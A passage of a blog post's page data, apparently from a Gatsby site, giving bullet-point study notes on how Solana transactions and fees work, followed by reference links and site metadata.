specify a list of all accounts to read or write.</li>\n<li>By requiring these accounts in advance, the runtime can parallelize execution across all transactions.</li>\n<li>When a transaction is submitted to the cluster, the runtime processes the commands atomically in sequence.</li>\n<li>For each command, the receiving program interprets the data array and operates on the specified account.</li>\n<li>The program returns successfully or returns with an error code.</li>\n<li>If an error is returned, the entire transaction fails immediately</li>\n<li>All transactions that attempt to withdraw from the account or modify data require the signature of the account holder.</li>\n<li>All accounts to be modified are marked as writable.</li>\n<li>Deposits may be made to the account without the owner’s permission as long as the transaction fee payer covers the necessary rent and transaction fees.</li>\n<li>All transactions must refer to the latest block hash before submission.</li>\n<li>Blockhash is used to prevent duplication and remove outdated transactions</li>\n<li>Maximum duration of transaction block hash is 150 blocks</li>\n</ul>\n<h2 id=\"fee\" style=\"position:relative;\"><a href=\"#fee\" aria-label=\"fee permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fee</h2>\n<ul>\n<li>The solana network collects two types of fees.\n<ol>\n<li>Transaction fees (gas fee)</li>\n<li>Rent fees</li>\n</ol>\n</li>\n<li>In solana, transaction fees are decisive.</li>\n<li>There is no concept of a fee market where users can pay higher fees to increase their chances of being included in the next block.</li>\n<li>Because it is only determined by the number of signatures required and there is currently a hard cap of 1232 bytes for every transaction</li>\n<li>Every transaction requires at least one writable account to sign the transaction</li>\n<li>Once submitted, the first serialized writable signer account becomes the fee payer.</li>\n<li>This account pays for the transaction regardless of whether the transaction is successful or not</li>\n<li>If the fee payer does not have enough balance to pay the transaction fee, the transaction will be stopped.</li>\n</ul>\n<h2 id=\"other-resources\" style=\"position:relative;\"><a href=\"#other-resources\" aria-label=\"other resources permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Resources</h2>\n<ul>\n<li><a href=\"https://docs.solana.com/developing/programming-model/transactions\">Solana Docs: transactions</a></li>\n<li><a href=\"https://medium.com/@asmiller1989/solana-transactions-in-depth-1f7f7fe06ac2\">Solana-transaction-in-depth</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#transactions\">Transactions</a></li>\n<li><a href=\"#fee\">Fee</a></li>\n<li><a href=\"#other-resources\">Other Resources</a></li>\n</ul>\n</div>","frontmatter":{"date":"July 31, 2022","title":"Solana Chain analysis Transactions","categories":"Solana","author":"Zer0Luck","emoji":"🌞"},"fields":{"slug":"/solana-chain-transaction/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/defi-wargame-4/","nextSlug":"/defi-wargame-3/","prevSlug":"/solana-chain-transaction/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}